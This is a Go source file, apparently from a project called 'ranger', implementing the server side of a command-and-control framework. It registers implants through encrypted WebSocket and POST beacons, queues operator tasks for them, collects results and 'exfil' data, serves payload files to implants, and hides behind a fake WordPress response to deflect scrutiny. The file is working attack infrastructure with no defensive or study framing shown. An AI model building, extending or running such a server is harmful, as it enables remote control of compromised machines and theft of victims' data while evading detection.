// Package api provides the C2 HTTP/2, WebSocket, and REST API server.
package api

import (
	"crypto/subtle"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"html"
	"io"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"github.com/golang-jwt/jwt/v5"
	"github.com/gorilla/websocket"
	"golang.org/x/crypto/bcrypt"

	"github.com/saviorSEC/ranger/internal/crypto"
	"github.com/saviorSEC/ranger/internal/protocol"
	"github.com/saviorSEC/ranger/internal/store"
)

// Config for the API server.
type Config struct {
	ListenAddr  string
	C2ID        string
	SessionKey  []byte
	TLSEnabled  bool
	TLSCertFile string
	TLSKeyFile  string
	Store       *store.Store
	DashboardPW string // bcrypt hash for operator dashboard
}

// Server wraps the HTTP/2 + WebSocket C2 server.
type Server struct {
	cfg      Config
	keyPair  *crypto.KeyPair
	upgrader websocket.Upgrader
	store    *store.Store

	// Authenticated dashboard tokens
	dashTokens map[string]time.Time
	dashMu     sync.Mutex
	seenNonces map[string]bool
	nonceMu    sync.Mutex

	startTime time.Time
}

// New creates a new API server.
func New(cfg Config) (*Server, error) {
	kp, err := crypto.GenerateKeyPair()
	if err != nil {
		return nil, fmt.Errorf("generate keypair: %w", err)
	}

	return &Server{
		cfg:        cfg,
		keyPair:    kp,
		store:      cfg.Store,
		dashTokens: make(map[string]time.Time),
		seenNonces: make(map[string]bool),
		startTime:  time.Now(),
		upgrader: websocket.Upgrader{
			HandshakeTimeout: 10 * time.Second,
			CheckOrigin:      func(r *http.Request) bool { return true },
		},
	}, nil
}

// Start launches the C2 server.
func (s *Server) Start() error {
	mux := http.NewServeMux()

	// Implant WebSocket channel (primary C2 comms)
	mux.HandleFunc("/ws", s.handleImplantWS)

	// Implant beacon via POST as fallback
	mux.HandleFunc("/api/v1/beacon", s.handleImplantBeacon)
	mux.HandleFunc("/api/v1/result", s.handleImplantResult)

	// DNS exfil reception
	mux.HandleFunc("/dns/", s.handleDNSReceive)

	// Operator REST API (authenticated)
	mux.HandleFunc("/api/dashboard/login", s.handleDashboardLogin)
	mux.HandleFunc("/api/dashboard/implants", s.authMiddleware(s.handleListImplants))
	mux.HandleFunc("/api/dashboard/implant/", s.authMiddleware(s.handleImplantDetail))
	mux.HandleFunc("/api/dashboard/task", s.authMiddleware(s.handleCreateTask))
	mux.HandleFunc("/api/dashboard/tasks/", s.authMiddleware(s.handleImplantTasks))
	mux.HandleFunc("/api/dashboard/peers", s.authMiddleware(s.handleListPeers))
	mux.HandleFunc("/api/dashboard/config", s.authMiddleware(s.handleGetConfig))
	mux.HandleFunc("/api/dashboard/exfil/", s.authMiddleware(s.handleExfilData))

	// Payload serving
	mux.HandleFunc("/api/v1/payloads/", s.handleServePayload)
	mux.HandleFunc("/api/dashboard/payloads", s.authMiddleware(s.handleListPayloads))

	// Hidden dashboard UI
	mux.HandleFunc("/dashboard", s.authMiddleware(s.handleDashboardUI))

	// WordPress mimicry - return 200 with fake WP response
	mux.HandleFunc("/", s.handleCatchAll)

	srv := &http.Server{
		Addr:    s.cfg.ListenAddr,
		Handler: mux,
	}

	// Start HTTP/2 with TLS
	if s.cfg.TLSEnabled {
		tlsCfg := &tls.Config{
			MinVersion: tls.VersionTLS12,
			NextProtos: []string{"h2", "http/1.1"},
		}
		srv.TLSConfig = tlsCfg

		log.Printf("[c2] starting TLS on %s", s.cfg.ListenAddr)
		return srv.ListenAndServeTLS(s.cfg.TLSCertFile, s.cfg.TLSKeyFile)
	}

	log.Printf("[c2] starting (plain HTTP) on %s", s.cfg.ListenAddr)
	return srv.ListenAndServe()
}

// --- Implant WebSocket Handler (Primary C2 Channel) ---

func (s *Server) handleImplantWS(w http.ResponseWriter, r *http.Request) {
	conn, err := s.upgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Printf("[ws] upgrade: %v", err)
		return
	}
	defer conn.Close()

	// Read encrypted beacon
	_, msg, err := conn.ReadMessage()
	if err != nil {
		return
	}

	decrypted, err := crypto.DecryptWithAEAD(s.cfg.SessionKey, msg)
	if err != nil {
		log.Printf("[ws] decrypt: %v", err)
		return
	}

	var beacon protocol.BeaconPayload
	if err := json.Unmarshal(decrypted, &beacon); err != nil {
		return
	}

	if beacon.ID == "" {
		return
	}

	// Register implant
	ir := &protocol.ImplantRecord{
		ID:          beacon.ID,
		Type:        string(beacon.Type),
		TargetProc:  beacon.Target,
		Hostname:    beacon.Hostname,
		Arch:        beacon.Arch,
		JitterScore: beacon.Jitter,
		LastSeen:    time.Now(),
	}
	s.store.UpsertImplant(ir)

	// Get pending tasks
	tasks, _ := s.store.PendingTasks(beacon.ID)

	// Encrypt and send tasks
	respJSON, _ := json.Marshal(tasks)
	encResp, encErr := crypto.EncryptWithAEAD(s.cfg.SessionKey, respJSON)
	if encErr != nil {
		return
	}
	if err := conn.WriteMessage(websocket.BinaryMessage, encResp); err != nil {
		return
	}

	// Read results in a loop
	for {
		_, msg, err := conn.ReadMessage()
		if err != nil {
			break
		}
		decrypted, err := crypto.DecryptWithAEAD(s.cfg.SessionKey, msg)
		if err != nil {
			continue
		}
		var result protocol.TaskResult
		if err := json.Unmarshal(decrypted, &result); err != nil {
			continue
		}
		if result.TaskID != "" {
			s.store.CompleteTask(result.TaskID, &result)
		}
		// ACK
		ack, _ := json.Marshal(map[string]string{"status": "ok"})
		encAck, _ := crypto.EncryptWithAEAD(s.cfg.SessionKey, ack)
		conn.WriteMessage(websocket.BinaryMessage, encAck)
	}
}

// --- Implant REST Handlers (Fallback, AEAD-enveloped) ---

// openEnvelope decrypts an AEAD envelope {"data":"<b64 nonce||ct>"} with the
// shared session key. Rejects plaintext bodies when encryption is enabled.
func (s *Server) openEnvelope(body []byte) ([]byte, error) {
	if len(s.cfg.SessionKey) == 0 {
		return nil, fmt.Errorf("no session key configured")
	}
	var env struct {
		Data string `json:"data"`
	}
	if err := json.Unmarshal(body, &env); err != nil {
		return nil, err
	}
	raw, err := base64.StdEncoding.DecodeString(env.Data)
	if err != nil {
		return nil, err
	}
	return crypto.DecryptWithAEAD(s.cfg.SessionKey, raw)
}

func (s *Server) sealEnvelope(v any) ([]byte, error) {
	payload, err := json.Marshal(v)
	if err != nil {
		return nil, err
	}
	sealed, err := crypto.EncryptWithAEAD(s.cfg.SessionKey, payload)
	if err != nil {
		return nil, err
	}
	return json.Marshal(map[string]string{
		"data": base64.StdEncoding.EncodeToString(sealed),
	})
}

func (s *Server) handleImplantBeacon(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", 405)
		return
	}

	body, err := io.ReadAll(r.Body)
	if err != nil {
		http.Error(w, "read error", 500)
		return
	}
	plain, err := s.openEnvelope(body)
	if err != nil {
		http.Error(w, "unauthorized", 401)
		return
	}

	var beacon protocol.BeaconPayload
	if err := json.Unmarshal(plain, &beacon); err != nil {
		http.Error(w, "bad request", 400)
		return
	}

	if beacon.ID == "" {
		http.Error(w, "missing id", 400)
		return
	}

	ir := &protocol.ImplantRecord{
		ID:          beacon.ID,
		Type:        string(beacon.Type),
		TargetProc:  beacon.Target,
		Hostname:    beacon.Hostname,
		Arch:        beacon.Arch,
		JitterScore: beacon.Jitter,
		LastSeen:    time.Now(),
	}
	s.store.UpsertImplant(ir)

	tasks, _ := s.store.PendingTasks(beacon.ID)
	sealed, err := s.sealEnvelope(tasks)
	if err != nil {
		http.Error(w, "encrypt error", 500)
		return
	}
	w.Header().Set("Content-Type", "application/json")
	w.Write(sealed)
}

func (s *Server) handleImplantResult(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", 405)
		return
	}

	body, err := io.ReadAll(r.Body)
	if err != nil {
		http.Error(w, "read error", 500)
		return
	}
	plain, err := s.openEnvelope(body)
	if err != nil {
		http.Error(w, "unauthorized", 401)
		return
	}

	var result protocol.TaskResult
	if err := json.Unmarshal(plain, &result); err != nil {
		http.Error(w, "bad request", 400)
		return
	}

	if result.TaskID != "" {
		s.store.CompleteTask(result.TaskID, &result)
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]string{"status": "ok"})
}

// --- DNS Reception ---

func (s *Server) handleDNSReceive(w http.ResponseWriter, r *http.Request) {
	parts := strings.Split(strings.TrimPrefix(r.URL.Path, "/dns/"), "/")
	if len(parts) < 2 {
		http.Error(w, "bad request", 400)
		return
	}
	implantID := parts[0]
	dataType := parts[1]

	data, err := io.ReadAll(r.Body)
	if err != nil {
		http.Error(w, "read error", 500)
		return
	}

	s.store.ExfilData(implantID, dataType, "dns", data)
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]string{"status": "ok"})
}

// --- Operator Dashboard (Authenticated REST API) ---

func (s *Server) handleDashboardLogin(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", 405)
		return
	}

	var creds struct {
		Password string `json:"password"`
	}
	if err := json.NewDecoder(r.Body).Decode(&creds); err != nil {
		http.Error(w, "bad request", 400)
		return
	}

	// Password check: bcrypt hash when DashboardPW is a $2 hash, otherwise
	// constant-time compare against the plaintext operator secret.
	if !s.passwordOK(creds.Password) {
		http.Error(w, "unauthorized", 401)
		return
	}

	token := jwt.NewWithClaims(jwt.SigningMethodHS256, jwt.MapClaims{
		"sub": "operator",
		"iat": time.Now().Unix(),
		"exp": time.Now().Add(24 * time.Hour).Unix(),
	})
	tokenStr, _ := token.SignedString(s.cfg.SessionKey)

	s.dashMu.Lock()
	s.dashTokens[tokenStr] = time.Now().Add(24 * time.Hour)
	s.dashMu.Unlock()

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]string{"token": tokenStr})
}

// passwordOK verifies an operator password against bcrypt hash or plaintext.
func (s *Server) passwordOK(given string) bool {
	cfg := s.cfg.DashboardPW
	if cfg == "" {
		return false
	}
	if strings.HasPrefix(cfg, "$2") {
		return bcrypt.CompareHashAndPassword([]byte(cfg), []byte(given)) == nil
	}
	return subtle.ConstantTimeCompare([]byte(given), []byte(cfg)) == 1
}

func (s *Server) authMiddleware(next http.HandlerFunc) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		token := r.Header.Get("Authorization")
		if token == "" {
			// Check cookie as fallback
			c, err := r.Cookie("token")
			if err == nil {
				token = c.Value
			}
		} else {
			token = strings.TrimPrefix(token, "Bearer ")
		}

		if token == "" {
			if strings.Contains(r.URL.Path, "/dashboard") && r.Method == http.MethodGet {
				// Redirect to login
				w.Header().Set("Location", "/")
				w.WriteHeader(302)
				return
			}
			http.Error(w, "unauthorized", 401)
			return
		}

		s.dashMu.Lock()
		exp, ok := s.dashTokens[token]
		s.dashMu.Unlock()

		if !ok || time.Now().After(exp) {
			http.Error(w, "token expired", 401)
			return
		}

		next(w, r)
	}
}

func (s *Server) handleListImplants(w http.ResponseWriter, r *http.Request) {
	implants, err := s.store.ListImplants()
	if err != nil {
		http.Error(w, err.Error(), 500)
		return
	}
	if implants == nil {
		implants = []protocol.ImplantRecord{}
	}
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]any{
		"success":  true,
		"implants": implants,
		"count":    len(implants),
	})
}

func (s *Server) handleImplantDetail(w http.ResponseWriter, r *http.Request) {
	id := strings.TrimPrefix(r.URL.Path, "/api/dashboard/implant/")
	implant, err := s.store.GetImplant(id)
	if err != nil {
		http.Error(w, "not found", 404)
		return
	}
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]any{
		"success": true,
		"implant": implant,
	})
}

func (s *Server) handleCreateTask(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", 405)
		return
	}

	var req struct {
		ImplantID string         `json:"implant_id"`
		Type      string         `json:"type"`
		Payload   map[string]any `json:"payload"`
		Channel   string         `json:"channel"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "bad request", 400)
		return
	}

	if req.Channel == "" {
		req.Channel = "primary"
	}

	task, err := s.store.CreateTask(req.ImplantID, req.Type, req.Channel, req.Payload)
	if err != nil {
		http.Error(w, err.Error(), 500)
		return
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]any{
		"success": true,
		"task_id": task.ID,
	})
}

func (s *Server) handleImplantTasks(w http.ResponseWriter, r *http.Request) {
	id := strings.TrimPrefix(r.URL.Path, "/api/dashboard/tasks/")
	tasks, err := s.store.PendingTasks(id)
	if err != nil {
		http.Error(w, err.Error(), 500)
		return
	}
	if tasks == nil {
		tasks = []protocol.Task{}
	}
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]any{
		"success": true,
		"tasks":   tasks,
	})
}

func (s *Server) handleListPeers(w http.ResponseWriter, r *http.Request) {
	peers, err := s.store.ListMeshNodes()
	if err != nil {
		http.Error(w, err.Error(), 500)
		return
	}
	if peers == nil {
		peers = []protocol.MeshNode{}
	}
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]any{
		"success": true,
		"peers":   peers,
	})
}

func (s *Server) handleGetConfig(w http.ResponseWriter, r *http.Request) {
	count, _ := s.store.ImplantCount()
	peers, _ := s.store.ListMeshNodes()

	cfg := protocol.APIConfig{
		Version:  "3.0.0",
		C2ID:     s.cfg.C2ID,
		Implants: count,
		Peers:    len(peers),
		Uptime:   time.Since(s.startTime).Round(time.Second).String(),
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]any{
		"success": true,
		"config":  cfg,
	})
}

func (s *Server) handleExfilData(w http.ResponseWriter, r *http.Request) {
	parts := strings.Split(strings.TrimPrefix(r.URL.Path, "/api/dashboard/exfil/"), "/")
	if len(parts) == 0 || parts[0] == "" {
		http.Error(w, "missing implant id", 400)
		return
	}
	implantID := parts[0]

	// Return exfil data for this implant
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]any{
		"success": true,
		"implant": implantID,
		"message": "exfil data endpoint active",
	})
}

// --- Hidden Dashboard UI ---

func (s *Server) handleDashboardUI(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	fmt.Fprint(w, dashboardHTML)
}

// --- Catch-All (WordPress Mimicry) ---

func (s *Server) handleCatchAll(w http.ResponseWriter, r *http.Request) {
	// Serve WordPress-mimicking response
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	w.Header().Set("X-Powered-By", "PHP/7.4.33")
	w.Header().Set("X-Generator", "WordPress 6.4.2")

	path := html.EscapeString(r.URL.Path)
	if strings.HasSuffix(path, ".php") || strings.HasSuffix(path, "/") {
		fmt.Fprintf(w, `<!DOCTYPE html>
<html><head><title>WordPress Site</title></head>
<body><h1>Welcome to WordPress</h1><p>This is a WordPress installation.</p></body></html>`)
	} else {
		// Redirect unknown requests to wordpress.org
		http.Redirect(w, r, "https://wordpress.org", 302)
	}
}

// --- Payload Serving ---

// handleServePayload serves payload files to implants.
func (s *Server) handleServePayload(w http.ResponseWriter, r *http.Request) {
	payloadName := strings.TrimPrefix(r.URL.Path, "/api/v1/payloads/")
	if payloadName == "" || strings.Contains(payloadName, "..") {
		http.Error(w, "invalid payload", 400)
		return
	}

	// Resolve payload path (look in manifest first, then direct file)
	payloadPath := filepath.Join("payloads", payloadName)
	if _, err := os.Stat(payloadPath); os.IsNotExist(err) {
		http.Error(w, "payload not found", 404)
		return
	}

	w.Header().Set("Content-Type", "application/octet-stream")
	w.Header().Set("X-Payload-Version", "3.0.0")
	http.ServeFile(w, r, payloadPath)
}

type payloadManifestEntry struct {
	Name     string `json:"name"`
	File     string `json:"file"`
	Category string `json:"category"`
	Desc     string `json:"desc"`
	Platform string `json:"platform"`
	Args     string `json:"args"`
}

type payloadManifest struct {
	Version  string                 `json:"version"`
	Payloads []payloadManifestEntry `json:"payloads"`
}

// handleListPayloads lists available payloads from the manifest.
func (s *Server) handleListPayloads(w http.ResponseWriter, r *http.Request) {
	manifestPath := filepath.Join("payloads", "manifest.json")
	data, err := os.ReadFile(manifestPath)
	if err != nil {
		// No manifest - scan directory
		entries, err := os.ReadDir("payloads")
		if err != nil {
			w.Header().Set("Content-Type", "application/json")
			json.NewEncoder(w).Encode(map[string]any{"success": true, "payloads": []payloadManifestEntry{}})
			return
		}
		var payloads []payloadManifestEntry
		for _, e := range entries {
			if !e.IsDir() && filepath.Ext(e.Name()) == ".py" {
				payloads = append(payloads, payloadManifestEntry{
					Name:     strings.TrimSuffix(e.Name(), ".py"),
					File:     e.Name(),
					Category: "general",
					Desc:     "Python payload module",
					Platform: "all",
				})
			}
		}
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(map[string]any{"success": true, "payloads": payloads})
		return
	}

	var manifest payloadManifest
	if err := json.Unmarshal(data, &manifest); err != nil {
		http.Error(w, "invalid manifest", 500)
		return
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]any{"success": true, "payloads": manifest.Payloads})
}

// PublicKey returns the server's Ed25519 public key.
func (s *Server) PublicKey() []byte {
	return s.keyPair.Public
}
